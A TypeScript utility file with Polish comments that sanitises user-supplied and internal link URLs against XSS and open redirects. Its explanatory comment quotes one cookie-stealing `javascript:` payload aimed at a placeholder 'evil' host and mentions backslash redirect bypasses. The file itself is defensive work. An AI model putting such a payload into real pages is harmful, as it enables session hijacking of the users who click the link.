/**
 * Bezpieczny `href` dla adresów pochodzących od użytkownika.
 *
 * `submitted_linkedin` w zgłoszeniu z publicznej aplikacji przychodzi z
 * NIEUWIERZYTELNIONEGO formularza (`public_share.py`: `Form(None,
 * max_length=500)` — długość i nic więcej). Wyrenderowanie takiej wartości
 * wprost w `<a href>` daje stored XSS: `javascript:fetch('//evil/?c='+
 * document.cookie)` wykonuje się w sesji rekrutera, który kliknie link w
 * kolejce zgłoszeń. React escapuje treść tekstową, ale NIE waliduje schematów
 * URL w atrybutach.
 *
 * Dopuszczamy wyłącznie `http:` i `https:`. Wszystko inne — `javascript:`,
 * `data:`, `vbscript:`, adresy względne — zwraca `null`, a wołający renderuje
 * wtedy zwykły tekst zamiast linku. Allowlista, nie blacklista: lista
 * niebezpiecznych schematów jest otwarta i przeglądarki dokładają nowe.
 */

const ALLOWED_PROTOCOLS = new Set(["http:", "https:"]);

export function safeExternalHref(raw: string | null | undefined): string | null {
  if (!raw) return null;
  const trimmed = raw.trim();
  if (!trimmed) return null;
  try {
    // `new URL` bez bazy odrzuca adresy względne — i dobrze: link do profilu
    // ma być bezwzględny, a `//evil.example` (protocol-relative) nie ma tu
    // czego robić.
    const url = new URL(trimmed);
    return ALLOWED_PROTOCOLS.has(url.protocol) ? url.toString() : null;
  } catch {
    return null;
  }
}

/**
 * Bezpieczna ścieżka WEWNĘTRZNA (audyt 22.09 r2, AI-01).
 *
 * Link „wewnętrzny” rozpoznawany samym `startsWith("/") && !startsWith("//")`
 * przepuszczał `/\evil.example` — przeglądarka traktuje backslash jak ukośnik,
 * więc to adres protocol-relative do obcej domeny (Jarvis renderuje linki
 * z odpowiedzi modelu, a `?next=` logowania pochodzi z adresu, który ktoś
 * mógł podesłać). Zwraca ścieżkę tylko wtedy, gdy po rozwiązaniu względem
 * dowolnego originu zostaje w TYM SAMYM originie; inaczej `null`.
 */
const INTERNAL_BASE = "https://nexus.invalid";

export function safeInternalPath(raw: string | null | undefined): string | null {
  if (typeof raw !== "string" || !raw) return null;
  if (!raw.startsWith("/") || raw.startsWith("//")) return null;
  // Backslash, białe i sterujące znaki — przeglądarki je normalizują
  // (`/\x`, `/\t/x`), więc to one robią z ścieżki adres obcej domeny.
  if (/[\\\s\u0000-\u001f\u007f]/.test(raw)) return null;
  try {
    const url = new URL(raw, INTERNAL_BASE);
    if (url.origin !== INTERNAL_BASE) return null;
    return raw;
  } catch {
    return null;
  }
}
